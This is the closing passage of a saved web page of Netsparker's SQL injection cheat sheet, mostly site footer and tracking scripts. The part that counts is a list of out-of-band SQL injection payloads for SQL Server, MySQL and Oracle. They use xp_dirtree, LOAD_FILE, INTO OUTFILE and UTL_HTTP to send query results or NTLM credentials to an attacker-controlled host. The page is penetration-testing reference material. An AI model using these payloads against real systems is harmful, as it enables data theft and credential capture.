+<p>This attack can help you to get SQL Server user's Windows password of
+ target server, but possibly you inbound connection will be firewalled. 
+Can be very useful internal penetration tests. We force SQL Server to 
+connect our Windows UNC Share and capture data NTLM session with a tool 
+like Cain &amp; Abel.</p>
+<h4>Bulk insert from a UNC Share (S)&nbsp;<br><code>bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'</code></h4>
+<p>Check out Bulk Insert Reference to understand how can you use bulk insert.</p>
+<h2><a id="OutOfBandChannelAttacks" rel="noreferrer"></a>Out of Band Channel Attacks</h2>
+<h3>SQL Server</h3>
+<ul>
+<li>?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')<br>Makes DNS resolution request to {INJECT}.yourhost.com<br><br></li>
+<li>?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q<br>Makes DNS resolution request to {INJECTION}.yourhost.com<br><br>{INJECTION} = You want to run the query.</li>
+</ul>
+<h3>MySQL</h3>
+<ul style="list-style-type: circle;">
+<li>
+<p>?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\'))) <br>Makes a NBNS query request/DNS resolution request to yourhost.com</p>
+</li>
+</ul>
+<p></p>
+<p></p>
+<ul>
+<li>
+<p>?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')<br>Writes data to your shared folder/file</p>
+<p>{INJECTION} = You want to run the query.</p>
+</li>
+</ul>
+<h3>Oracle</h3>
+<ul>
+<li>
+<p>?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)<br>Sniffer application will save results</p>
+</li>
+<li>
+<p>?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)<br>Results will be saved in HTTP access logs</p>
+</li>
+<li>
+<p>?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)<br>You need to sniff dns resolution requests to yourhost.com</p>
+</li>
+<li>
+<p>?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)<br>You need to sniff dns resolution requests to yourhost.com</p>
+<p>{INJECTION} = You want to run the query.</p>
+</li>
+</ul>
+<h2 id="VulnerabilityClassificationSeverityTable">Vulnerability Classification and Severity Table</h2>
+<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 mb20 nolrpad">
+<div class="table-responsive">
+<table class="table table-condensed table-classification">
+<thead>
+<tr>
+<th>Classification</th>
+<th>ID / Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PCI v3.1</td>
+<td>6.5.1</td>
+</tr>
+<tr>
+<td>PCI v3.2</td>
+<td>6.5.1</td>
+</tr>
+<tr>
+<td>OWASP 2013</td>
+<td>A1</td>
+</tr>
+<tr>
+<td>CWE</td>
+<td>89</td>
+</tr>
+<tr>
+<td>CAPEC</td>
+<td>66</td>
+</tr>
+<tr>
+<td>WASC</td>
+<td>19</td>
+</tr>
+<tr>
+<td>HIPAA</td>
+<td>164.306(a), 164.308(a)</td>
+</tr>
+<tr>
+<td class="classification-subtitle" colspan="2">CVSS 3.0 Score</td>
+</tr>
+<tr>
+<td>Base</td>
+<td><i class="fa fa-stop fa-5 mr5 critical" aria-hidden="true"></i> 10 (Critical)</td>
+</tr>
+<tr>
+<td>Temporal</td>
+<td><i class="fa fa-stop fa-5 mr5 critical" aria-hidden="true"></i> 10 (Critical)</td>
+</tr>
+<tr>
+<td>Environmental</td>
+<td><i class="fa fa-stop fa-5 mr5 critical" aria-hidden="true"></i> 10 (Critical)</td>
+</tr>
+<tr>
+<td class="classification-subtitle" colspan="2">CVSS Vector String</td>
+</tr>
+<tr>
+<td colspan="2">CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+		    
+
+<form action="https://go.netsparker.com/l/869541/2021-05-10/3t2snz" id="form-pardot-whitepaper1" method="get" role="form" _lpchecked="1" enctype="multipart/form-data" style="display: none;">
+	<input name="__RequestVerificationToken" type="hidden" value="L45aUFwXArjTN0YBKJNv_WZi7pkqw7rQiMSGqX_3LnFYF8OTRxWQBj_OPrL4DC2HhzCjgJlElxlYmq3M9m7ASPz1iMGO8jCxIuI5GWh6IQA1">
+    <input type="hidden" id="utm_source" name="utm_source" value="">
+	<input type="hidden" id="utm_medium" name="utm_medium" value="">
+	<input type="hidden" id="utm_campaign" name="utm_campaign" value="">
+	<input type="hidden" id="utm_content" name="utm_content" value="">
+	<input type="hidden" id="utm_concept" name="utm_concept" value="">
+	<input type="hidden" id="utm_term" name="utm_term" value="">
+  
+	<input type="hidden" id="gclid" name="gclid" value="">
+	<input type="hidden" id="vwo_variation" name="vwo_variation" value="">
+	<input type="hidden" id="vwo_id" name="vwo_id" value="">
+
+	   <input type="hidden" id="landing_page_url" name="landing_page_url" value="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">
+
+	<input type="hidden" id="ga_client_id" name="ga_client_id" value="">
+	<input type="hidden" id="previous_page_url" name="previous_page_url" value="https://www.google.com/">
+	  
+	 
+     
+     <input type="hidden" id="Country" name="Country" value="IN">
+	 
+	  
+	<input type="hidden" id="form_submit_url" name="form_submit_url" value="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">
+
+	<input type="hidden" id="netsparker" name="netsparker" value="true">
+	<input type="hidden" id="success_location" name="success_location" value="https://www.netsparker.com/statics/pdf/invicti-white-paper-flexible-web-application-security-testing-deployments-for-government-agencies.pdf">
+	<div class="input-group">
+		<input class="form-control tooltip-ok valid" data-toggle="tooltip" data-val="true" data-val-maxlength="The field Email must be a string or array type with a maximum length of '75'." data-val-maxlength-max="75" data-val-required="The Email field is required." id="Email" name="Email" placeholder="Work Email *" required="required" type="email" aria-required="true" aria-describedby="Email-error" aria-invalid="false">
+		<span class="input-group-btn">
+			<button class="btn btn-orange-d noshadow noborder" id="downloadPDFbutton5263" type="submit">Download</button>
+		</span>
+	</div>
+	<span class="field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true" id="emailValidation"></span>
+	 <div class="text-privacy">
+  <p class="blogPrivacy">Your Information will be kept <a href="https://www.netsparker.com/privacy-policy/" target="_blank" rel="noreferrer">private.</a></p>
+ </div>
+</form>
+            
+				  <div class="blog-v2-read-author section-padding-normal section-padding-small-bottom">
+					<div class="row">
+						<div class="col-md-4 col-sm-5 col-xs-12 blog-v2-read-author-left text-center">
+						
+							   <a data-toggle="modal" data-target="#lightbox" class="zcursor" href="#"><img src="sql%20injection%20cheat%20sheet_files/ferruh-mavituna.jpg" alt="Ferruh Mavituna"></a>
+							    
+							<div class="blog-v2-read-top-social-icons text-center">
+
+
+							</div>
+						</div>
+						<div class="col-md-8 col-sm-7 col-xs-12 blog-v2-read-author-right">
+							<h2>About the Author</h2>
+							<div class="blog-v2-read-author-name">Ferruh Mavituna</div>
+							<p>Ferruh Mavituna is the founder and CEO of Invicti Security, a 
+world leader in web application vulnerability scanning. His professional
+ obsessions lie in web application security research, automated 
+vulnerability detection, and exploitation features. He has authored 
+several web security research papers and tools and delivers animated 
+appearances at cybersecurity conferences and on podcasts. Exuberant at 
+the possibilities open to organizations by the deployment of automation,
+ Ferruh is keen to demonstrate what can be achieved in combination with 
+Invicti’s award-winning products, Netsparker and Acunetix.</p>
+						</div>
+					</div>
+				</div>
+
+				<div id="subscripbeModal" class="sticky-email-subscribe text-center activated sticky">
+					<div class="sticky-email-subscribe-text">Stay up to date on web security trends</div>
+					<form action="https://netsparker.us18.list-manage.com/subscribe/post?u=5b95175e9d922bf109568e064&amp;id=c41662cd70" method="post" id="mc-embedded-subscribe-form-sidebar" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="">
+						<input class="form-control" id="email-sidebar-sticky" name="EMAIL" placeholder="Email" type="email">
+						<button type="submit" id="subscribe1872706c-sidebar-sticky" class="btn btn-orange btn-orange-d btn-block">SUBSCRIBE</button>
+					</form>
+				    <div class="text-privacy mt10"><p>Your Information will be kept <a href="https://www.netsparker.com/privacy-policy/" target="_blank" rel="noreferrer">private.</a></p></div>
+				</div>
+        </div>
+    </div>
+	 
+		<div class="container-fluid section-padding-normal section-padding-small-bottom gray-section blog-v2-other-posts">
+			<h2 class="text-center mt0">Related Articles</h2>
+
+				<div class="g-container container blog-v2-other-posts">
+					<div class="row">
+							<div class="col-md-3 col-sm-6 col-xs-6 blog-v2-other-post">
+									<a href="https://www.netsparker.com/blog/web-security/top-dangerous-injection-attacks/" rel="noreferrer">
+									   <img class="unpretty" src="sql%20injection%20cheat%20sheet_files/injection-attacks-sm.png" alt="Top 5 Most Dangerous Injection Attacks" width="200" height="105">
+										<h3>Top 5 Most Dangerous Injection Attacks</h3>
+								</a>
+							</div>
+							<div class="col-md-3 col-sm-6 col-xs-6 blog-v2-other-post">
+									<a href="https://www.netsparker.com/blog/web-security/netsparker-advisory-program-vulnerability-example/" rel="noreferrer">
+									   <img class="unpretty" src="sql%20injection%20cheat%20sheet_files/netsparker-vulnerability-advisories-sm.png" alt="Real-Life Vulnerabilities Reported by Netsparker" width="200" height="105">
+										<h3>Real-Life Vulnerabilities Reported by Netsparker</h3>
+								</a>
+							</div>
+							<div class="col-md-3 col-sm-6 col-xs-6 blog-v2-other-post">
+									<a href="https://www.netsparker.com/blog/web-security/how-blind-sql-injection-works/" rel="noreferrer">
+									   <img class="unpretty" src="sql%20injection%20cheat%20sheet_files/blind-sql-injection-sm.png" alt="How Blind SQL Injection Works" width="200" height="105">
+										<h3>How Blind SQL Injection Works</h3>
+								</a>
+							</div>
+							<div class="col-md-3 col-sm-6 col-xs-6 blog-v2-other-post">
+									<a href="https://www.netsparker.com/blog/web-security/web-security-program-enterprise-security-weekly-164/" rel="noreferrer">
+									   <img class="unpretty" src="sql%20injection%20cheat%20sheet_files/web-security-program-enterprise-security-weekly-164-sm.jpg" alt="Ferruh Mavituna Talks About Building a Realistic Web Security Program on Enterprise Security Weekly #164" width="200" height="105">
+										<h3>Ferruh Mavituna Talks About Building a Realistic Web Security Program on Enterprise Security Weekly #164</h3>
+								</a>
+							</div>
+					</div>
+				</div>
+
+		</div>
+</main>
+
+<div id="lightbox" class="modal" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="modal-dialog">
+        <button type="button" class="close hidden" data-dismiss="modal" aria-hidden="true">X</button>
+        <div class="modal-content">
+            <div class="modal-body">
+                <img src="sql%20injection%20cheat%20sheet_files/blank.png" alt="">
+            </div>
+        </div>
+    </div>
+</div>
+        <div class="hidden-xs hidden-sm hidden-md footer-push "></div>
+    </div>
+        <div id="new-branding" class="footer ">
+                <div class="footer-top">
+                </div>
+                <div class="footer-body">
+                    <div class="container g-container">
+                            <div class="footer-cols">
+						       <div>
+                                <img class="mb10 footerlogo" src="sql%20injection%20cheat%20sheet_files/netsparker-new-logo-no-icon.svg" alt="Netsparker Logo - Web Application Security Scanner" width="130" height="27">
+                                <div class="social-icons">
+                                    <a href="https://twitter.com/netsparker" target="_blank" rel="noopener noreferrer"><i class="fa fa-twitter fa-2x"></i></a>
+                                    <a href="https://facebook.com/netsparker" target="_blank" rel="noopener noreferrer"><i class="fa fa-facebook fa-2x"></i></a>
+                                    <a href="https://www.linkedin.com/company/netsparker" target="_blank" rel="noopener noreferrer"><i class="fa fa-linkedin fa-2x"></i></a>
+                                    <a href="https://feeds.feedburner.com/netsparker" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss fa-2x"></i></a>
+                                </div>
+								  
+								 <div class="company-info">
+										<p>Netsparker Ltd <br>220 Industrial Blvd Ste 102<br>Austin, TX 78745</p>
+								</div>
+								<div class="copyright hidden-md">
+								  <p>© Netsparker 2021, by Invicti</p>
+								</div>
+                            </div>
+						    
+                            <div>
+                                <p>RESOURCES</p>
+                                <ul>
+                                    <li><a href="https://www.netsparker.com/features/" rel="noreferrer">Features</a></li>
+                                    <li><a href="https://www.netsparker.com/integrations/" rel="noreferrer">Integrations</a></li>
+                                    <li><a href="https://www.netsparker.com/pricing/" rel="noreferrer">Pricing</a></li>
+                                    <li><a href="https://www.netsparker.com/case-studies/" rel="noreferrer">Case Studies</a></li>
+                                    <li><a href="https://www.netsparker.com/web-applications-advisories/" rel="noreferrer">Advisories</a></li>
+                                    <li><a href="https://www.netsparker.com/white-papers/" rel="noreferrer">White Papers</a></li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p>USE CASES</p>
+                                <ul>
+                                    <li><a href="https://www.netsparker.com/penetration-testing-software/" rel="noreferrer">Penetration Testing Software</a></li>
+                                    <li><a href="https://www.netsparker.com/website-security-scanner/" rel="noreferrer">Website Security Scanner</a></li>
+                                    <li><a href="https://www.netsparker.com/ethical-hacking-software/" rel="noreferrer">Ethical Hacking Software</a></li>
+                                    <li><a href="https://www.netsparker.com/web-vulnerability-scanner/" rel="noreferrer">Web Vulnerability Scanner</a></li>
+                                    <li><a href="https://www.netsparker.com/vulnerability-scanner-comparison/" rel="noreferrer">Comparisons</a></li>
+                                    <li><a href="https://www.netsparker.com/online-web-application-security-scanner/" rel="noreferrer">Online Application Scanner</a></li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p>WEB SECURITY</p>
+                                <ul>
+                                    <li><a href="https://www.netsparker.com/blog/web-security/false-positives-web-application-security/" rel="noreferrer">The Problem with False Positives</a></li>
+                                    <li><a href="https://www.netsparker.com/blog/web-security/comparison-commercial-non-commercial-web-application-security-scanner/" rel="noreferrer">Why Pay for Web Scanners</a></li>
+                                    <li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" rel="noreferrer">SQL Injection Cheat Sheet</a></li>
+                                    <li><a href="https://www.netsparker.com/blog/web-security/getting-started-web-application-security/" rel="noreferrer">Getting Started with Web Security</a></li>
+                                    <li><a href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/" rel="noreferrer">Vulnerability Index</a></li>
+                                    <li><a href="https://www.netsparker.com/blog/web-security/content-security-policy/" rel="noreferrer">Using Content Security Policy to Secure Web Applications</a></li>
+                                </ul>
+                            </div>
+                            <div>
+                                <p>COMPANY</p>
+                                <ul>
+                                    <li><a href="https://www.netsparker.com/about/" rel="noreferrer">About Us</a></li>
+                                    <li><a href="https://www.netsparker.com/contact/" rel="noreferrer">Contact Us</a></li>
+                                    <li><a href="https://www.netsparker.com/support/" rel="noreferrer">Support</a></li>
+                                    <li><a href="https://www.netsparker.com/careers/" rel="noreferrer">Careers</a></li>
+                                    <li><a href="https://www.netsparker.com/resources/" rel="noreferrer">Resources</a></li>
+                                    <li><a href="https://www.netsparker.com/partners/" rel="noreferrer">Partners</a></li>
+                                </ul>
+                            </div>
+                         
+                        </div>
+                    </div>
+                </div>
+            <div class="container g-container">
+                <div class="footer-bottom">
+                    <div class="row">
+                       
+                        <div class="col-md-9 col-sm-12 col-xs-12">
+						   <div class="copyright visible-md">
+								  <p>© Netsparker 2021, by Invicti</p>
+							</div>
+                            <a href="https://www.netsparker.com/ssa/" rel="noreferrer">Subscription Services Agreement</a>  <a href="https://www.netsparker.com/data-protection-policy/" rel="noreferrer">Data Protection Policy</a>  <a href="https://www.netsparker.com/isp/" rel="noreferrer">Information Security Policy</a>  <a href="https://www.netsparker.com/privacy-policy/" rel="noreferrer">Privacy Policy</a>  <a href="https://www.netsparker.com/sitemap/" rel="noreferrer">Sitemap</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+
+
+	
+
+
+
+
+
+
+
+ 
+  
+<!-- Google Analytics -->
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ 
+  ga('create', 'UA-27264250-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+  
+ <!-- Google Tag Manager -->
+<script defer="defer">
+  const mediaQuery = window.matchMedia('(max-width: 768px)')
+
+  if (mediaQuery.matches) {
+	  setTimeout(function() {
+		  (function(w, d, s, l, i) {
+			  w[l] = w[l] || [];
+			  w[l].push({
+				  'gtm.start': new Date().getTime(),
+				  event: 'gtm.js'
+			  });
+			  var f = d.getElementsByTagName(s)[0],
+				  j = d.createElement(s),
+				  dl = l != 'dataLayer' ? '&l=' + l : '';
+			  j.async = true;
+			  j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+			  f.parentNode.insertBefore(j, f);
+		  })(window, document, 'script', 'dataLayer', 'GTM-M7R7MXJ');
+	  }, 6000);
+  } else {
+	  (function(w, d, s, l, i) {
+		  w[l] = w[l] || [];
+		  w[l].push({
+			  'gtm.start': new Date().getTime(),
+			  event: 'gtm.js'
+		  });
+		  var f = d.getElementsByTagName(s)[0],
+			  j = d.createElement(s),
+			  dl = l != 'dataLayer' ? '&l=' + l : '';
+		  j.async = true;
+		  j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+		  f.parentNode.insertBefore(j, f);
+	  })(window, document, 'script', 'dataLayer', 'GTM-M7R7MXJ');
+  }
+ </script>
+<!-- End Google Tag Manager -->
+   
+	
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe sandbox="allow-scripts allow-same-origin allow-presentation" src="https://www.googletagmanager.com/ns.html?id=GTM-M7R7MXJ"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+ 
+   
+
+
+
+
+
+ 
+
+
+ 
+  
+
+  
+  
+    
+  
+  
+   
+ 
+ 
+   
+   
+   
+ 
+  
+    
+  
+    
+ 
+ 
+    
+
+  
+ 
+ 
+ 
+ 
+   
+   
+  
+    
+ 
+
+ 
+  
+ 
+
+ 
+   
+ 
+
+ 
+  
+ 
+
+ 
+  
+ 
+
+ 
+  
+ 
+  
+ 
+  
+ 
+
+
+
+ 
+
+ 
+  
+  
+
+
+  
+  
+
+  
+  
+  
+  
+    
+   
+ 
+  
+      
+    
+  
+
+  
+
+  
+  
+  
+
+
+   <script async="" type="text/javascript">
+		window._vwo_code = window._vwo_code || (function(){
+		var account_id=301870,
+		settings_tolerance=2000,
+		library_tolerance=2500,
+		use_existing_jquery=false,
+		is_spa=1,
+		hide_element='body',
+
+		/* DO NOT EDIT BELOW THIS LINE */
+		f=false,d=document,code={use_existing_jquery:function(){return use_existing_jquery;},library_tolerance:function(){return library_tolerance;},finish:function(){if(!f){f=true;var a=d.getElementById('_vis_opt_path_hides');if(a)a.parentNode.removeChild(a);}},finished:function(){return f;},load:function(a){var b=d.createElement('script');b.src=a;b.type='text/javascript';b.innerText;b.onerror=function(){_vwo_code.finish();};d.getElementsByTagName('head')[0].appendChild(b);},init:function(){
+		window.settings_timer=setTimeout('_vwo_code.finish()',settings_tolerance);var a=d.createElement('style'),b=hide_element?hide_element+'{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}':'',h=d.getElementsByTagName('head')[0];a.setAttribute('id','_vis_opt_path_hides');a.setAttribute('type','text/css');if(a.styleSheet)a.styleSheet.cssText=b;else a.appendChild(d.createTextNode(b));h.appendChild(a);this.load('https://dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&f='+(+is_spa)+'&r='+Math.random());return settings_timer; }};window._vwo_settings_timer = code.init(); return code; }());	  
+  </script>	
+  <!-- End VWO Async SmartCode -->
+
+	
+<link href="sql%20injection%20cheat%20sheet_files/prism.css" rel="stylesheet"><script src="sql%20injection%20cheat%20sheet_files/prism.js"></script>
+    
+    <script src="sql%20injection%20cheat%20sheet_files/jquery"></script>
+
+    <script src="sql%20injection%20cheat%20sheet_files/bootstrap"></script>
+
+    
+    
+    
+    
+    
+    
+  
+  	
+  		
+
+    <script src="sql%20injection%20cheat%20sheet_files/subnav.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/menuactivation.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/jquery.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/imageLazyLoad.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/custom.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/blog-read.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/demo-box.js"></script>
+<script src="sql%20injection%20cheat%20sheet_files/blog-pdf.js"></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+	
+
+	  
+
+    <script type="application/ld+json">
+        {
+        "@context" : "http://schema.org",
+        "@type" : "Organization",
+        "name" : "Netsparker",
+        "logo" : "https://dpsvdv74uwwos.cloudfront.net/statics/netsparker-new-favicon.png",
+        "telephone" : [ "+1 415 877 4450", "+44 (0)20 3588 3840" ],
+        "faxNumber" : "+44 (0)20 3588 3846",
+        "email" : "contact@netsparker.com",
+        "url" : "https://www.netsparker.com/",
+        "sameAs": [
+        "http://www.facebook.com/facebook",
+        "https://twitter.com/netsparker",
+        "https://www.linkedin.com/company/netsparker-ltd",
+        "https://plus.google.com/117335596680718226953"
+        ],
+        "address" :
+        {
+        "@type": "PostalAddress",
+        "streetAddress" : "Cannon Place, 78 Cannon Street",
+        "addressLocality" : "London",
+        "addressRegion" : "City of London",
+        "addressCountry" : "United Kingdom",
+        "postalCode" : "EC4N 6AF"
+        }
+        }
+    </script>
+
+
+<script type="text/javascript" id="">function LoadDriftWidget(){var a=window.driftt=window.drift=window.driftt||[];if(!a.init){if(a.invoked)return void(window.console&&console.error&&console.error("Drift snippet included twice."));a.invoked=!0;a.methods="identify config track reset debug show ping page hide off on".split(" ");a.factory=function(c){return function(){var b=Array.prototype.slice.call(arguments);return b.unshift(c),a.push(b),a}};a.methods.forEach(function(c){a[c]=a.factory(c)});a.load=function(c){var b=3E5,d=Math.ceil(new Date/
+b)*b;b=document.createElement("script");b.type="text/javascript";b.async=!0;b.crossorigin="anonymous";b.src="https://js.driftt.com/include/"+d+"/"+c+".js";c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(b,c)}}drift.SNIPPET_VERSION="0.3.1";drift.load("nxnpy4hr8cdu")};</script>
+<script type="text/javascript" id="">piAId="870541";piCId="45982";piHostname="pi.pardot.com";(function(){function b(){var a=document.createElement("script");a.type="text/javascript";a.src=("https:"==document.location.protocol?"https://pi":"http://cdn")+".pardot.com/pd.js";var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a,c)}window.attachEvent?window.attachEvent("onload",b):window.addEventListener("load",b,!1)})();</script>
+<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","3504723296205409");fbq("track","PageView");</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=3504723296205409&amp;ev=PageView&amp;noscript=1"></noscript>
+<script type="text/javascript" id="">!function(b){var a=b.clearbit=b.clearbit||[];if(!a.initialize)if(a.invoked)b.console&&console.error&&console.error("Clearbit snippet included twice.");else{a.invoked=!0;a.methods="trackSubmit trackClick trackLink trackForm pageview identify reset group track ready alias page once off on".split(" ");a.factory=function(c){return function(){var d=Array.prototype.slice.call(arguments);d.unshift(c);a.push(d);return a}};for(b=0;b<a.methods.length;b++){var e=a.methods[b];a[e]=a.factory(e)}a.load=function(c){var d=
+document.createElement("script");d.async=!0;d.src=("https:"===document.location.protocol?"https://":"http://")+"x.clearbitjs.com/v1/"+c+"/clearbit.min.js";c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(d,c)};a.SNIPPET_VERSION="3.1.0";a.load("pk_ecfdcef8a7543b5b1807b1fe352bab00");a.page()}}(window);</script>
+<script type="text/javascript" id="">(function(a,c,e,f,d,b){a.hj=a.hj||function(){(a.hj.q=a.hj.q||[]).push(arguments)};a._hjSettings={hjid:2144097,hjsv:6};d=c.getElementsByTagName("head")[0];b=c.createElement("script");b.async=1;b.src=e+a._hjSettings.hjid+f+a._hjSettings.hjsv;d.appendChild(b)})(window,document,"https://static.hotjar.com/c/hotjar-",".js?sv\x3d");</script><script type="text/javascript" id="">(function(a,b,c){a.techtargetic=a.techtargetic||{};a.techtargetic.client=c;a=b.createElement("script");a.type="text/javascript";a.async=!0;a.crossorigin="anonymous";c=new Date;c.getFullYear();c.getMonth();c.getDate();a.src="https://trk.techtarget.com/tracking.js";b=b.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})(window,document,"16667886");</script><script type="text/javascript" id="">(function(a,b,c,d,e){a=b.createElement(c);b=b.getElementsByTagName(c)[0];a.async=1;a.id=e;a.src=d;b.parentNode.insertBefore(a,b)})(window,document,"script","https://tag.demandbase.com/5d2f088d2315fd57.min.js","demandbase_js_lib");</script><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon393601629903"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon656747168912" alt="" src="sql%20injection%20cheat%20sheet_files/0.txt" width="0" height="0"></div></body></html>
